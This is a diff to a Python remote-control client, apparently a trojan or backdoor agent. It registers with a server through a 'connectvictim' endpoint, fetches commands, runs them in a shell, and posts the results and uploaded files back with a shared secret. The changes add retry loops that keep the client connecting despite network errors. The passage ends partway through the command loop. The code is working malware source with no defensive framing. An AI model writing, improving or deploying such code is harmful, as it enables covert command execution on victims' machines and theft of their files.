@@ -4,33 +4,49 @@ import requests
 import time
 import os
 
-url = 'http://127.0.0.1:8000/'
+
+url = 'http://127.0.0.1:8000'
+
 api_key = 'secure_password'
 
 def RunApp(AppName):
     subprocess.run(AppName,shell=True,capture_output=True,text=True,errors='ignore')
 
 def send(result):
-    requests.post(url=url+'postresult',data={'SECRET_KEY':api_key,'command_result':result})
-
+    while True:
+        try:
+            requests.post(url=url+'postresult',data={'SECRET_KEY':api_key,'command_result':result})
+            break
+        except:
+            pass
 def sendfile(filename):
     with open(filename,'rb') as file:
-        requests.post(url=url+'uploadfile',data={'SECRET_KEY':api_key,'command_result':filename+' is saved succesfully'},files={'file':(filename,file)})
-
+        while True:
+            try:
+                requests.post(url=url+'uploadfile',data={'SECRET_KEY':api_key,'command_result':filename+' is saved succesfully'},files={'file':(filename,file)})
+                break
+            except:
+                pass
 while True:
-    r = requests.post(url=url+'connectvictim',data={'SECRET_KEY':api_key})
-    if r.status_code == 404:
-        exit()
-    if r.status_code == 200:
-        break
-
+    try:
+        r = requests.post(url=url+'connectvictim',data={'SECRET_KEY':api_key})
+        if r.status_code == 404:
+            exit()
+        if r.status_code == 200:
+            break
+    except:
+        pass
 while True:
     command = requests.get(url=url+'getcommand',data={'SECRET_KEY':api_key})
     if command.status_code == 200:
         msg = command.json()['command_to_exec']
         if msg == 'exit':
-            requests.post(url=url+'endsession',data={'SECRET_KEY':api_key})
-            break
+            while True:
+                try:
+                    requests.post(url=url+'endsession',data={'SECRET_KEY':api_key})
+                    break
+                except:
+                    pass
         if msg[:2]=='cd':
             if 'cd' == msg:
                 send(os.getcwd())
